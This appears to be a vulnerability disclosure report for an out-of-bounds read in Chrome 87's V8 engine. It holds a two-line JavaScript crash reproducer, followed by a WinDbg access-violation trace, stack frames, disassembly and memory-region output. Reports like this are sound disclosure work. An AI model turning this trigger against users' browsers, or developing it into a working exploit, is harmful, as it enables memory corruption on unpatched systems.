<b>VULNERABILITY DETAILS</b>
Out of Bounds in V8

<b>VERSION</b>
Chrome Version: [87.0.4280.88] + [stable]
Operating System: win 10

<b>REPRODUCTION CASE</b>

```js
var trigger = (loop = new class{ [1337] = ()=>"p4nda"})=>loop
trigger()[1337]
```

1. open chrome.exe
2. open an DevTools page and then input the javascript code in console tab (I think it also can trigge via a html file).



<b>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION</b>
Type of crash: [tab]
Crash State: 

0:025> g
(2404.1a14): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome!std::__1::__cxx_atomic_load [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35]:
00007ffa`8f426875 8b41ff          mov     eax,dword ptr [rcx-1] ds:00007b77`1800009b=????????
0:000> kbL
 # RetAddr           : Args to Child                                                           : Call Site
00 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::__cxx_atomic_load
01 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::__atomic_base<int,0>::load
02 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::atomic_load_explicit
03 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::base::Relaxed_Load
04 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::base::AsAtomicImpl<int>::Relaxed_Load
05 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::TaggedField<v8::internal::MapWord,0>::Relaxed_Load
06 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map_word
07 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map
08 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map+0x10
09 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::StringShape::StringShape+0x10
0a (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::String::IsFlat+0x10
0b (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::IncrementalStringBuilder::CanAppendByCopy+0x19
0c 00007ffa`8f233745 : 00000000`00000036 00007ffa`8f2eb923 0000ae64`ada957b1 0000022c`ebd9c75f : chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35
0d 00007ffa`8f2333f7 : 00000000`00000000 0000022c`eb8037f8 0000022c`ebda08d8 00000000`955fd300 : chrome!v8::internal::`anonymous namespace'::NativeCodeFunctionSourceString+0x125
0e 00007ffa`8ef84b5f : 00007b77`000000ff 01007ffa`8ef50316 0000ae64`ada954d1 00000000`00000000 : chrome!v8::internal::JSFunction::ToString+0x1a7
0f 00007ffa`8ef84867 : 0000001a`955fcc60 000000c6`955fcd10 000000c6`955fcf01 00000000`00000000 : chrome!v8::internal::Builtin_Impl_FunctionPrototypeToString+0x8f
10 00007ffa`8f94687c : 00007b77`081ca0a9 00007b77`08244569 00000000`0000001a 000000c6`955fc868 : chrome!v8::internal::Builtin_FunctionPrototypeToString+0x47
11 00007ffa`8f8d7ff8 : 00007b77`080423b1 00007b77`08244569 00000000`0000000a 00007b77`08042429 : chrome!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x3c
12 00007ffa`8f8d7ff8 : 00007b77`08243ef1 00007b77`080d355d 00007b77`085ef399 00000000`0000007a : chrome!Builtins_InterpreterEntryTrampoline+0xd8
13 00007ffa`8f8d5afb : 00007b77`080d355d 00007b77`083a7001 00000000`00000022 000000c6`955fca40 : chrome!Builtins_InterpreterEntryTrampoline+0xd8
14 00007ffa`8f8d56ec : 000000c6`955fd978 00000000`00000000 00000000`00000000 000000c6`955fd8a8 : chrome!Builtins_JSEntryTrampoline+0x5b
15 00007ffa`8f015972 : 0000022c`eb7ec218 00007ffa`8f07d3e3 0000022c`ebf1d860 0000ae64`ada95851 : chrome!Builtins_JSEntry+0xcc
16 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::GeneratedCode<unsigned long long,unsigned long long,unsigned long long,unsigned long long,unsigned long long,long long,unsigned long long **>::Call+0x1b
17 00007ffa`8f015642 : 0000ae64`ada959d1 00007b77`082443f1 000000c6`955fcd18 00007ffa`8f288e9c : chrome!v8::internal::`anonymous namespace'::Invoke+0x2b2
18 00007ffa`8f246d57 : 0000022c`ebd67300 00007ffa`8f0630e9 00007ffa`94f9a988 00007ffa`8f41b382 : chrome!v8::internal::Execution::Call+0xc2
19 00007ffa`8f246ada : 00000000`00000000 0000022c`e9d96600 0000022c`eb7ec2b8 0000022c`e9d90000 : chrome!v8::internal::JSReceiver::OrdinaryToPrimitive+0x197
1a 00007ffa`8f2853a9 : 000000c6`955fcf80 00007ffa`8ef00ff0 00000000`00000010 0000022c`00000000 : chrome!v8::internal::JSReceiver::ToPrimitive+0x6a
1b 00007ffa`8ef06ee6 : 0000022c`eb7ec2c8 00007ffa`c29095f1 0000ae64`ada95cf1 00000000`00000000 : chrome!v8::internal::Object::ConvertToString+0xf9
1c (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::Object::ToString+0x2e
1d 00007ffa`8f60f28e : 0000022c`ec05a9f0 000000c6`955fd120 0000022c`eb7ec2e0 0000022c`eb7ec2d8 : chrome!v8::Value::ToString+0x186
1e 00007ffa`8f60e645 : 000000c6`955fd908 000000c6`955fd968 00007ffa`94f270b0 0000022c`eb7ec2b8 : chrome!v8_inspector::`anonymous namespace'::descriptionForFunction+0x4e
1f 00007ffa`8f5a2123 : ffffffff`ffffffff 0100022c`ebd54be0 00000000`00000001 00007ffa`8f03fa8a : chrome!v8_inspector::`anonymous namespace'::FunctionMirror::buildRemoteObject+0x595
20 00007ffa`8f5a3620 : 00000000`00000000 00000000`00000000 00000000`00000000 00007ffa`8f5b065a : chrome!v8_inspector::InjectedScript::wrapObjectMirror+0x83
21 00007ffa`8f5a8ebc : 00000000`00000000 00007ffa`94f27560 000000c6`955fd070 00007b77`00000000 : chrome!v8_inspector::InjectedScript::wrapObject+0xa0
22 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8_inspector::InjectedScript::wrapObject+0x29
23 00007ffa`8f5a88c8 : 00007b77`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome!v8_inspector::InjectedScript::ProtocolPromiseHandler::thenCallback+0x2bc
24 00007ffa`8ef5c11e : 000000c6`955fd070 00007b77`00000000 00000000`00000000 00000000`00000000 : chrome!v8_inspector::InjectedScript::ProtocolPromiseHandler::thenCallback+0x38
25 00007ffa`8ef5b566 : 00007b77`080d3a7d 00000000`00000000 00000000`00000000 00000000`00000020 : chrome!v8::internal::FunctionCallbackArguments::Call+0x12e
26 00007ffa`8ef5ab89 : 000000c6`955fd860 ffffffff`ffffffff 0000022c`ebd672c0 00007b77`0000006b : chrome!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>+0x166
27 00007ffa`8ef5a827 : 0000022c`eb7ec290 00007ffa`8f02fef9 0000022c`ebac5ab0 00007ffa`8f02a382 : chrome!v8::internal::Builtin_Impl_HandleApiCall+0xf9
28 00007ffa`8f94687c : 00007b77`080d35c5 00007ffa`8f996ef5 00007b77`08243f11 00000000`00000002 : chrome!v8::internal::Builtin_HandleApiCall+0x47
29 00007ffa`8f99659b : 00007b77`080423b1 00007b77`088a9525 00000000`0000000c 00007b77`08042429 : chrome!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x3c
2a 00007ffa`8f8f8a6e : 00007b77`088a9525 00007b77`080d35c5 00007b77`080d39fd 00007b77`08243f11 : chrome!Builtins_PromiseFulfillReactionJob+0x3b
2b 00007ffa`8f8d59ec : 00000000`00000000 00000000`00000000 00000000`00000002 00000000`00000000 : chrome!Builtins_RunMicrotasks+0x28e
2c 00007ffa`8f015fc3 : 00000000`00000000 00000000`080423b1 00000000`00000002 000000c6`955fdde0 : chrome!Builtins_JSRunMicrotasksEntry+0xcc
2d (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::GeneratedCode<unsigned long long,unsigned long long,v8::internal::MicrotaskQueue *>::Call+0x5
2e 00007ffa`8f016a5f : 00007b77`00000000 00000000`00000000 00000000`00000000 00000000`00000020 : chrome!v8::internal::`anonymous namespace'::Invoke+0x903
2f 00007ffa`8f016b66 : 0000022c`e9b40000 00007ffa`c2906e2c 0000022c`e9d90000 00007ffa`00000002 : chrome!v8::internal::`anonymous namespace'::InvokeWithTryCatch+0x6f
30 00007ffa`8f03d3c2 : 00000000`00000000 00000000`00000000 0000022c`eba59770 00000000`00000002 : chrome!v8::internal::Execution::TryRunMicrotasks+0x66
31 00007ffa`8f03d18f : 0000022c`ebd54be0 000000c6`955fdf48 0000022c`ec05a790 0000022c`eba59770 : chrome!v8::internal::MicrotaskQueue::RunMicrotasks+0x202
32 00007ffa`8f5a439c : 000000c6`955fe110 000000c6`955fdf78 000000c6`955fe050 000000c6`955fe110 : chrome!v8::internal::MicrotaskQueue::PerformCheckpoint+0x1f
33 00007ffa`8f5ec19c : 0000022c`ebd48850 00000000`00000000 00000000`00000000 00000000`00000140 : chrome!v8_inspector::InjectedScript::addPromiseCallback+0x11c
34 00007ffa`8f59a720 : 0000022c`00000002 0000022c`ec051f01 0000022c`ebadfe90 0000022c`ec051f10 : chrome!v8_inspector::V8RuntimeAgentImpl::evaluate+0x60c
35 00007ffa`8f613d79 : 000000c6`955fe660 aaaaaaaa`aaaaaaaa 0000022c`e9b74c70 0000022c`ebd54c10 : chrome!v8_inspector::protocol::Runtime::DomainDispatcherImpl::evaluate+0x380
36 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::__function::__policy_func<void ()>::operator()+0xa
37 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::function<void ()>::operator()+0xa
38 00007ffa`8f5e2c00 : 0000022c`ebe55650 000000c6`955fe598 000000c6`955fe790 0000022c`e9bfc8c0 : chrome!v8_crdtp::UberDispatcher::DispatchResult::Run+0x19
39 00007ffa`923098ac : 0000022c`e9d902a4 00000000`00000000 00000000`00000000 00000000`00000010 : chrome!v8_inspector::V8InspectorSessionImpl::dispatchProtocolMessage+0x110
3a 00007ffa`923096a2 : 0000022c`e9bee098 00000000`00000000 000000c6`955fe9a0 00007ffa`8ff6c8e3 : chrome!blink::DevToolsSession::DispatchProtocolCommandImpl+0xcc
3b 00007ffa`8fa5d5f5 : 0000ae64`ada97b11 00000000`ebbf4101 000000c6`955fe9e0 00007ffa`8d97fc59 : chrome!blink::DevToolsSession::DispatchProtocolCommand+0x52
3c 00007ffa`8d1edd50 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000001 : chrome!blink::mojom::blink::DevToolsSessionStubDispatch::Accept+0x135
3d 00007ffa`90b167d8 : 0000022c`e9bb1498 00007ffa`8ff6efb6 00000000`00000000 00000000`00000000 : chrome!mojo::InterfaceEndpointClient::HandleValidatedMessage+0x230
3e 00007ffa`90b14581 : 00000001`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome!IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnProxyThread+0x108
3f (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::internal::FunctorTraits<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),void>::Invoke+0x19
40 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::internal::InvokeHelper<0,void>::MakeItSo+0x21
41 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunImpl+0x25
42 00007ffa`8d166df9 : aaaaaaaa`aaaaaa01 0000ae64`ada97921 00000000`00000000 00000000`00000000 : chrome!base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce+0x41
43 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::OnceCallback<void ()>::Run+0x15
44 00007ffa`90948a5f : 000000c6`955feee8 00007ffa`8d155f6e 00000000`00000000 000000c6`955fee48 : chrome!base::TaskAnnotator::RunTask+0x169
45 00007ffa`90948671 : aaaaaaaa`aaaaaaaa aaaaaaaa`aaaaaaaa aaaaaaaa`aaaaaaaa 000000c6`955ff200 : chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x22f
46 00007ffa`8d16456f : 00007ffa`8d1fa8ab 00000000`00000000 00000000`ffffff00 000000c6`955ff258 : chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x91
47 00007ffa`8d16440e : 00000000`ffffff00 0000ae64`ada96201 00000000`955ff201 00007ffa`8d157d49 : chrome!base::MessagePumpDefault::Run+0x7f
48 00007ffa`8d163db6 : 00000000`00000030 0000022c`e9bdf3e0 000000c6`955ff280 00007ffa`94ad97cb : chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0x6e
49 00007ffa`908d62f1 : 00007ffa`94ca30a8 aaaaaaaa`00000002 00007ffa`94ca4740 00007ffa`8d1ad8f9 : chrome!base::RunLoop::Run+0xb6
4a 00007ffa`8d178d5a : 00000000`00000008 00007ffa`c005b68a 000000c6`955ff3d0 00007ffa`94ad9a1e : chrome!content::RendererMain+0x381
4b 00007ffa`8fef2504 : 00007ffa`c2a70000 00000000`02000002 00000000`00000000 00000000`00000000 : chrome!content::ContentMainRunnerImpl::Run+0x12a
4c 00007ffa`8d1601cd : 00000000`00000016 0000022c`e9b426d0 00000000`0000017c 00000000`955ff600 : chrome!content::RunContentProcess+0x364
4d 00007ffa`8d155118 : 00000000`955ff600 0000022c`e9b66110 000000c6`955ff7d0 00000000`00000008 : chrome!content::ContentMain+0x3d
4e 00007ff7`e762269d : 0000022c`e9b534e0 00007ffa`8d154fb0 00000000`00000008 000000c6`955ff7e0 : chrome!ChromeMain+0x168
4f 00007ff7`e7621b8f : 000000c6`955ff908 000000c6`955ff9f0 00000000`00000000 00000000`00000000 : chrome_exe!MainDllLoader::Launch+0x1ad
50 00007ff7`e776f142 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome_exe!wWinMain+0xb8f
51 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome_exe!invoke_main+0x21
52 00007ffa`c1567034 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome_exe!__scrt_common_main_seh+0x106
53 00007ffa`c293d0d1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14
54 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21

0:000> u
chrome!std::__1::__cxx_atomic_load [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317] [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35 [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317]]:
00007ffa`8f426875 8b41ff          mov     eax,dword ptr [rcx-1]
00007ffa`8f426878 0fb7440207      movzx   eax,word ptr [rdx+rax+7]
00007ffa`8f42687d 83e007          and     eax,7
00007ffa`8f426880 6683f801        cmp     ax,1
00007ffa`8f426884 0f8483000000    je      chrome!v8::internal::IncrementalStringBuilder::AppendString+0xcd (00007ffa`8f42690d)
00007ffa`8f42688a 4889cb          mov     rbx,rcx
00007ffa`8f42688d 4889ca          mov     rdx,rcx
00007ffa`8f426890 4c21c2          and     rdx,r8

0:000> u
chrome!std::__1::__cxx_atomic_load [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317] [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35 [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317]]:
00007ffa`8f426875 8b41ff          mov     eax,dword ptr [rcx-1]
00007ffa`8f426878 0fb7440207      movzx   eax,word ptr [rdx+rax+7]
00007ffa`8f42687d 83e007          and     eax,7
00007ffa`8f426880 6683f801        cmp     ax,1
00007ffa`8f426884 0f8483000000    je      chrome!v8::internal::IncrementalStringBuilder::AppendString+0xcd (00007ffa`8f42690d)
00007ffa`8f42688a 4889cb          mov     rbx,rcx
00007ffa`8f42688d 4889ca          mov     rdx,rcx
00007ffa`8f426890 4c21c2          and     rdx,r8
0:000> !address 00007b77`1800009b

                                     
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  <unknown>
Base Address:           00007b77`088c0000
End Address:            00007b78`00000000
Region Size:            00000000`f7740000 (   3.866 GB)
State:                  00002000          MEM_RESERVE
Protect:                <info not present at the target>
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00007b77`00000000
Allocation Protect:     00000001          PAGE_NOACCESS


Content source: 0 (invalid), length: e7ffff65

